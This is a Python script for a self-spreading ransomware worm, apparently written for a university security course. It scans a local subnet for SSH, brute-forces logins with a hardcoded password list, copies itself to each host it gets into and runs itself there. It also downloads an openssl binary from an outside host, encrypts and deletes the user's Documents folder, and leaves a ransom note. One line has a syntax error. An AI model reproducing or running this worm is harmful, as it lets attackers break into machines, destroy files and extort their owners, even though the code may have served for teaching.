import paramiko
import sys
import nmap
import os
import os.path
import socket, fcntl, struct
import netifaces
import urllib
from subprocess import call
import shutil
import tarfile

markerLocation = "/tmp/extort_marker.txt"

wordList = [
('awesomeUserName', 'badPassword'),
('awesomeHacker101', 'password'),
('ubuntu', '123456'),		#VM1
('best_username', 'awesomePassword'),
('ubuntu', 'password'),		#VM2
('ubuntu', 'password1') ]	#VM3

def getHostsOnTheSameNetwork():
	
	# Create an instance of the port scanner class
	portScanner = nmap.PortScanner()
	
	# Scan the network for systems whose
	# port 22 is open (that is, there is possibly
	# SSH running there). 
	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
		
	# Scan the network for hoss
	hostInfo = portScanner.all_hosts()	
	
	# The list of hosts that are up.
	liveHosts = []
	
	# Go trough all the hosts returned by nmap
	# and remove all who are not up and running
	for host in hostInfo:
		
		# Is ths host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)
	
	
		
	return liveHosts


# Find if the target has already been infected with our worm
def isTargetInfected(ssh):

	infected = False
	try:
		sftpClient = ssh.open_sftp()
		     
		# Check if the file exists
		sftpClient.stat(markerLocation)
	 
		# The system is already infected
		infected = True
		print("Target is already infected!!")
	except:
		print("Target should be infected!!")

	return infected



def markSystem():
	marker = open(markerLocation, "w")
	marker.write("Dont forget to place witty remark here...")
	marker.close()


def getMachineIp():
	# Get all the network interfaces on the system
	networkInterfaces = netifaces.interfaces()
	
	# The IP address
	ipAddr = None
	
	# Go through all the interfaces
	for netFace in networkInterfaces:
		
		# The IP address of the interface
		addr = netifaces.ifaddresses(netFace)[2][0]['addr'] 
		
		# Get the IP address
		if not addr == "127.0.0.1":
			
			# Save the IP addrss and break
			ipAddr = addr
			break	 
			
	return ipAddr
	


def attackHost(host):

	global wordList

	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	numTries = 0

	for (_username, _password) in wordList:
		try:
			ssh.connect(host, username=_username, password=_password)
			return (ssh, _username, _password)
		except:
			numTries = numTries + 1

	return None


def encryptVictim():
	try:
		tar = tarfile.open("/home/ubuntu/Documents.tar", "w:gz")

		# Add the exdir/ directory to the archive
		tar.add("/home/ubuntu/Documents/")

		# Close the archive file
		tar.close()

		# Encrypt
		call(["chmod", "a+x", "/tmp/openssl"])
		call(["openssl", "aes-256-cbc", "-a", "-salt", "-in", "/home/ubuntu/Documents.tar", "-out", "/home/ubuntu/Documents.enc", "-k", "cs456worm"])

		# Remove files
		shutil.rmtree('/home/ubuntu/Documents/')
		call(["rm", '/home/ubuntu/Documents.tar'])

		# Tell user to pay up

		ransom = open("/home/ubuntu/BetterPayMe.txt, "w")
		ransom.write("Your documents folder has been encrypted and I will need 1,000,000 bitcoin in order to decrypt!!\n Thank you have a nice day!!")
		ransom.close()
	except:
		print("Couldn't encypt victim")



markSystem();

wormLocation = "/tmp/extorter_worm.py"

network = getHostsOnTheSameNetwork()

if len(sys.argv) >= 2:
	if sys.argv[1] == "-host":
		print("This is the host computer will not encrypt this Documents folder!")
		wormLocation = "extorter_worm.py"
	elif sys.argv[1] == "-t":
		print("Testing spreading with this IP: %s" %(str(sys.argv[2])))
		wormLocation = "extorter_worm.py"
		network = [sys.argv[2]]
else:
	urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl", "/tmp/openssl")
	encryptVictim()


for Host in network:		

	print ("Trying host: " + Host)
	sshInfo = attackHost(Host)

	currIp = getMachineIp()

	if sshInfo and Host != currIp:
		print("Success! Got in!!")
		
		if isTargetInfected(sshInfo[0]) == False:
			print("Spreading to this machine: %s" %(str(Host)))
			try:
				sftpClient = sshInfo[0].open_sftp()
				sftpClient.put(wormLocation, "/tmp/" + "extorter_worm.py")
				sshInfo[0].exec_command("chmod a+x /tmp/extorter_worm.py")
				sshInfo[0].exec_command("nohup python /tmp/extorter_worm.py &")
			except:
				print ("Something went wrong")

print("Finshed being wormy!!")

	




